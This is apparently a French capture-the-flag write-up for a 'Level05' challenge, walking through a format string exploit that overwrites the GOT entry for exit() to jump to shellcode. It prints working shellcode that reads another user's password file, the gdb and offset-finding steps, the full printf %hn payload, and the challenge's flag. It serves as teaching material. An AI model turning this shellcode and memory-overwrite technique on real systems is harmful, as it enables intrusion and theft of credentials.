# Level05

## Point de depart

Le programme lit une entree avec fgets(), convertit les majuscules en minuscules, puis affiche le resultat avec printf(buffer). Le probleme: printf(buffer) permet d'exploiter une faille de format string

L'objectif est de remplacer l'adresse de la fonction exit() par l'adresse de notre code malveillant (shellcode). Quand le programme appellera exit(), il executera notre code a la place.

## Etape 1 : Creer le shellcode

Le shellcode est du code machine qui ouvre et lit /home/users/level06/.pass. On le stocke dans une variable d'environnement.

```bash
export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

Les 16 premiers octets sont des instructions x90 (ne rien faire). Si on vise une adresse legerement incorrecte, le processeur glissera sur ces instructions jusqu'au vrai code.

## Etape 2 : Trouver l'adresse du shellcode

On doit savoir ou se trouve le shellcode en memoire. On cree un petit programme pour l'afficher.

```bash
cat > /tmp/getenv.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}
EOF

gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv
```

Adresse obtenue : 0xffffd868

## Etape 3 : Trouver l'adresse de exit()

On utilise gdb pour trouver ou le programme stocke l'adresse de exit().

```bash
gdb level05
disas exit
```

Resultat : jmp *0x80497e0

L'adresse 0x80497e0 est celle qu'on va modifier pour pointer vers notre shellcode au lieu de la vraie fonction exit().

## Etape 4 : Localiser notre input

On doit savoir a quelle position notre input apparait dans la memoire pour pouvoir y placer nos adresses.

On envoie des marqueurs reconnaissables et on les cherche :

```bash
./level05
aaaabbbb%1$p%2$p
```

On teste plusieurs positions (1, 2, 3...) jusqu'a trouver nos marqueurs. On utilise deux valeurs (aaaa et bbbb) car on aura besoin de deux emplacements : un pour l'adresse basse et un pour l'adresse haute.

```bash
./level05
aaaabbbb%10$p%11$p
```

Resultat : aaaabbbb0x616161610x62626262

0x61616161 correspond a aaaa (car a = 0x61 en hexadecimal).
0x62626262 correspond a bbbb (car b = 0x62 en hexadecimal).

Notre input est accessible aux positions 10 et 11.

## Etape 5 : Calculer les valeurs a ecrire

On veut ecrire l'adresse 0xffffd868 mais printf() ne peut pas ecrire 32 bits d'un coup avec %n. On decoupe en deux morceaux de 16 bits.

Adresse cible : 0xffffd868 (addr shellcode)

Partie basse (2 premiers octets) : 0xd868 = 55400 en decimal
Partie haute (2 derniers octets) : 0xffff = 65535 en decimal

On va ecrire ces deux valeurs a deux adresses consecutives :
- 0x80497e0 recevra 0xd868
- 0x80497e2 recevra 0xffff (2 octets plus loin)

## Etape 6 : Calculer les paddings

Le format string %n ecrit le nombre de caracteres affiches jusqu'ici. Pour ecrire 55400, il faut avoir affiche 55400 caracteres.

Le payload commence par 8 octets (les deux adresses de 4 octets chacune). Ces 8 octets comptent comme 8 caracteres deja affiches.

Premier padding (pour atteindre 55400 caracteres) :
55400 - 8 = 55392 caracteres

Deuxieme padding (pour atteindre 65535 caracteres au total) :
65535 - 55400 = 10135 caracteres

## Etape 7 : Construction du payload

Le payload final contient :
- L'adresse 0x80497e0 (en little-endian : octets inverses)
- L'adresse 0x80497e2 (en little-endian : octets inverses)
- Un padding de 55392 caracteres
- %10$hn pour ecrire 55400 a la premiere adresse
- Un padding de 10135 caracteres
- %11$hn pour ecrire 65535 a la deuxieme adresse

```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55392d%10\$hn' + '%10135d%11\$hn'" | ./level05
```

Le [::-1] inverse les octets car les processeurs x86 stockent les adresses a l'envers (little-endian)

1. On met les adresses de exit() au debut du buffer (\x08\x04\x97\xe0[::-1] + \x08\x04\x97\xe2[::-1]). Ces adresses se retrouvent aux positions 10 et 11 sur la pile.
2. printf() affiche 55400 caracteres, puis %10$hn lit l'adresse en position 10 (0x80497e0) et ecrit 55400 A CETTE ADRESSE. Donc printf() modifie le contenu de la memoire a l'adresse 0x80497e0.
3. printf() affiche encore 10135 caracteres (total 65535), puis %11$hn lit l'adresse en position 11 (0x80497e2) et ecrit 65535 A CETTE ADRESSE. Donc printf() modifie le contenu de la memoire a l'adresse 0x80497e2.
4. Resultat : la memoire a l'adresse 0x80497e0 contient maintenant 0xffffd868 (l'adresse de notre shellcode) au lieu de l'adresse de la vraie fonction exit().
5. Quand le programme appelle exit(), il va chercher l'adresse de exit() a l'emplacement 0x80497e0, trouve 0xffffd868, et saute vers notre shellcode.

## Resultat

Apres quelques secondes d'affichage, le flag apparait :

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```